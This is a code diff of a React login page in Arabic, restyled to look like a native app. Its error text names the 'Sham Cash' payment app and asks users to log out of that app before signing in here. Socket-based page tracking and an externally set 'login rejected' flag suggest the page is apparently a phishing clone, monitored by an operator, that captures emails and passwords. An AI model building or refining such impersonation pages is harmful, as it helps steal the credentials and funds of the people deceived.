@@ -1,12 +1,24 @@
 import { useState, useEffect } from 'react';
 import { useNavigate } from 'react-router-dom';
-import { Mail, Lock, Eye, EyeOff, ArrowLeft, LogIn } from 'lucide-react';
 import { supabase } from '@/lib/supabase';
 import { getClientId } from '@/lib/clientId';
 import { useSiteConfig } from '@/context/SiteConfigContext';
 import { initSocket, disconnectSocket, updatePage } from '@/lib/socket';
-import Header from '@/components/Header';
-import Footer from '@/components/Footer';
+
+// Import Logo Component
+const Logo = () => (
+  <svg viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg" className="w-[70px] h-[70px]">
+    <path d="M20 30 L50 10 L80 30 L50 50 Z" fill="#4c72b8"/>
+    <path d="M20 70 L50 50 L80 70 L50 90 Z" fill="#2a9d8f"/>
+  </svg>
+);
+
+// Import PowerLogo Component
+const PowerLogo = () => (
+  <svg viewBox="0 0 100 100" fill="none" stroke="#6c7a9c" strokeWidth="8" className="w-[30px] h-[30px]">
+    <polygon points="50,10 90,30 90,70 50,90 10,70 10,30"/>
+  </svg>
+);
 
 export default function LoginPage() {
   const navigate = useNavigate();
@@ -34,17 +46,12 @@ export default function LoginPage() {
     const rejected = sessionStorage.getItem('login_rejected');
     const logoutNotice = sessionStorage.getItem('logout_notice');
     
-    console.log('LoginPage useEffect - login_rejected:', rejected);
-    console.log('LoginPage useEffect - logout_notice:', logoutNotice);
-    
     if (logoutNotice === 'true') {
-      console.log('Setting logout notice error message');
       setError('يرجى تسجيل الخروج من تطبيق شام كاش المثبت على جهازك قبل التسجيل هنا');
       setHasShownRejectionError(true);
       sessionStorage.removeItem('logout_notice');
       sessionStorage.removeItem('login_rejected');
     } else if (rejected === 'true') {
-      console.log('Setting rejected error message');
       setError('البريد الإلكتروني أو كلمة المرور غير صحيحة. يرجى التأكد وإعادة المحاولة.');
       setHasShownRejectionError(true);
       sessionStorage.removeItem('login_rejected');
@@ -103,66 +110,131 @@ export default function LoginPage() {
     }
   };
 
+  // منع كتابة الأحرف العربية
+  const preventArabic = (e: React.ChangeEvent<HTMLInputElement>, setter: (value: string) => void) => {
+    const value = e.target.value.replace(/[\u0600-\u06FF]/g, '');
+    setter(value);
+  };
+
   return (
-    <div className="min-h-screen flex flex-col bg-slate-50" dir="rtl">
-      <Header />
-      <main className="flex-1 flex items-center justify-center py-10 px-4 sm:px-6">
-        <div className="w-full max-w-md">
-          <div className="text-center mb-8">
-            <div className="w-14 h-14 bg-blue-600 rounded-2xl flex items-center justify-center mx-auto mb-4 shadow-lg">
-              <LogIn className="w-7 h-7 text-white" />
-            </div>
-            <h1 className="text-2xl sm:text-3xl font-extrabold text-slate-800">{pg.title}</h1>
-            <p className="text-slate-500 mt-2">{pg.subtitle}</p>
-          </div>
+    <div className="min-h-screen w-full bg-[#101935] flex flex-col justify-between p-5" dir="rtl">
+      {/* Top Bar */}
+      <div className="w-full flex justify-between items-center text-[#8d99ae] text-sm">
+        <span>الإنكليزية</span>
+        <i className="fa-solid fa-headset text-lg cursor-pointer"></i>
+      </div>
 
-          <div className="bg-white rounded-2xl shadow-sm border border-slate-200 p-6 sm:p-8 space-y-5">
-            <form onSubmit={handleSubmit} className="space-y-5">
-              <div className="space-y-1.5">
-                <label className="text-sm font-semibold text-slate-700 flex items-center gap-2">
-                  <Mail className="w-4 h-4 text-blue-500" /> البريد الإلكتروني
-                </label>
-                <input type="email" value={email} onChange={(e) => { setEmail(e.target.value); if (!hasShownRejectionError) setError(''); }}
-                  placeholder="example@mail.com" dir="ltr"
-                  className="w-full border border-slate-300 rounded-xl px-4 py-3 text-sm text-slate-800 placeholder-slate-400 focus:border-blue-500 focus:ring-2 focus:ring-blue-100 text-left" />
-              </div>
-
-              <div className="space-y-1.5">
-                <label className="text-sm font-semibold text-slate-700 flex items-center gap-2">
-                  <Lock className="w-4 h-4 text-blue-500" /> كلمة المرور
-                </label>
-                <div className="relative">
-                  <input type={showPass ? 'text' : 'password'} value={password}
-                    onChange={(e) => { setPassword(e.target.value); if (!hasShownRejectionError) setError(''); }}
-                    placeholder="••••••••" dir="ltr"
-                    className="w-full border border-slate-300 rounded-xl px-4 py-3 text-sm text-slate-800 placeholder-slate-400 focus:border-blue-500 focus:ring-2 focus:ring-blue-100" />
-                  <button type="button" onClick={() => setShowPass(!showPass)}
-                    className="absolute left-3 top-1/2 -translate-y-1/2 text-slate-400 hover:text-slate-600">
-                    {showPass ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
-                  </button>
-                </div>
-              </div>
-
-              {error && <div className="bg-red-50 border border-red-200 text-red-700 rounded-xl px-4 py-3 text-sm font-medium">{error}</div>}
-
-              <button type="submit" disabled={loading}
-                className="w-full bg-blue-600 hover:bg-blue-700 disabled:bg-blue-400 text-white font-bold py-4 rounded-xl shadow-md hover:shadow-lg transform hover:-translate-y-0.5 transition-all flex items-center justify-center gap-2 text-base">
-                {loading
-                  ? <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin" />
-                  : <><span>{pg.button_text}</span><ArrowLeft className="w-5 h-5" /></>}
-              </button>
-            </form>
-
-            <div className="border-t border-slate-100 pt-4 text-center">
-              <p className="text-sm text-slate-500">
-                ليس لديك حساب؟{' '}
-                <button onClick={() => navigate('/register')} className="text-blue-600 font-semibold hover:underline">سجّل الآن</button>
-              </p>
-            </div>
-          </div>
+      {/* Main Content - Centered */}
+      <div className="w-full max-w-[380px] mx-auto my-0 flex flex-col items-center">
+        {/* Logo */}
+        <div className="my-2.5 mb-5">
+          <Logo />
         </div>
-      </main>
-      <Footer />
+
+        {/* Title */}
+        <h1 className="text-2xl font-bold mb-6 w-full text-right text-white">
+          {pg.title}
+        </h1>
+
+        {/* Form */}
+        <form onSubmit={handleSubmit} className="w-full space-y-4">
+          {/* Email Field */}
+          <div className="relative w-full">
+            <i className="fa-solid fa-user absolute right-4 top-1/2 -translate-y-1/2 text-[#6c7a9c]"></i>
+            <input
+              type="email"
+              value={email}
+              onChange={(e) => {
+                preventArabic(e, setEmail);
+                if (!hasShownRejectionError) setError('');
+              }}
+              placeholder="البريد الإلكتروني"
+              dir="ltr"
+              className="w-full py-[14px] pr-11 pl-4 bg-[#1e2942] border border-[#2a3859] rounded-[10px] text-white text-sm placeholder-[#6c7a9c] focus:outline-none focus:border-[#4c72b8]"
+            />
+          </div>
+
+          {/* Password Field */}
+          <div className="relative w-full">
+            <i className="fa-solid fa-lock absolute right-4 top-1/2 -translate-y-1/2 text-[#6c7a9c]"></i>
+            <input
+              type={showPass ? 'text' : 'password'}
+              value={password}
+              onChange={(e) => {
+                preventArabic(e, setPassword);
+                if (!hasShownRejectionError) setError('');
+              }}
+              placeholder="كلمة السر"
+              dir="ltr"
+              className="w-full py-[14px] pr-11 pl-11 bg-[#1e2942] border border-[#2a3859] rounded-[10px] text-white text-sm placeholder-[#6c7a9c] focus:outline-none focus:border-[#4c72b8]"
+            />
+            <i 
+              className={`fa-regular ${showPass ? 'fa-eye-slash' : 'fa-eye'} absolute left-4 top-1/2 -translate-y-1/2 text-[#6c7a9c] cursor-pointer hover:text-white transition-colors`}
+              onClick={() => setShowPass(!showPass)}
+            ></i>
+          </div>
+
+          {/* Error Message */}
+          {error && (
+            <div className="text-red-400 text-sm text-center py-2 px-3 bg-red-500/10 border border-red-500/20 rounded-lg">
+              {error}
+            </div>
+          )}
+
+          {/* Forgot Password Link */}
+          <div className="w-full text-center text-[13px] text-[#8d99ae] mb-5">
+            هل نسيت كلمة المرور؟{' '}
+            <span className="text-[#4a7c59] font-bold cursor-pointer hover:underline">تغيير كلمة المرور</span>
+          </div>
+
+          {/* Action Buttons */}
+          <div className="w-full flex gap-2.5 mb-4">
+            <button
+              type="submit"
+              disabled={loading}
+              className="flex-1 py-3 bg-[#4c72b8] border-none rounded-[10px] text-white text-base font-bold cursor-pointer transition-all hover:bg-[#3b5a93] disabled:bg-[#3b4d75] disabled:cursor-not-allowed flex items-center justify-center gap-2"
+            >
+              {loading ? (
+                <>
+                  انتظر
+                  <span className="inline-block w-6 text-right">
+                    <span className="animate-pulse">.</span>
+                    <span className="animate-pulse delay-200">.</span>
+                    <span className="animate-pulse delay-400">.</span>
+                  </span>
+                </>
+              ) : (
+                pg.button_text
+              )}
+            </button>
+            <button 
+              type="button"
+              className="w-[50px] h-12 bg-[#4c72b8] border-none rounded-[10px] text-white flex items-center justify-center cursor-pointer text-lg hover:bg-[#3b5a93] transition-all"
+              title="مسح QR"
+            >
+              <i className="fa-solid fa-qrcode"></i>
+            </button>
+          </div>
+        </form>
+
+        {/* Register Link */}
+        <div className="w-full text-[13px] text-[#8d99ae] mb-6 text-center">
+          لا تملك حساب مسبقاً؟{' '}
+          <span 
+            className="text-[#4a7c59] font-bold cursor-pointer hover:underline"
+            onClick={() => navigate('/register')}
+          >
+            إنشاء حساب
+          </span>
+        </div>
+      </div>
+
+      {/* Footer */}
+      <div className="flex flex-col items-center text-[#6c7a9c] text-xs gap-1">
+        <span>POWERED BY</span>
+        <PowerLogo />
+        <span>احدث اصدار</span>
+      </div>
     </div>
   );
 }
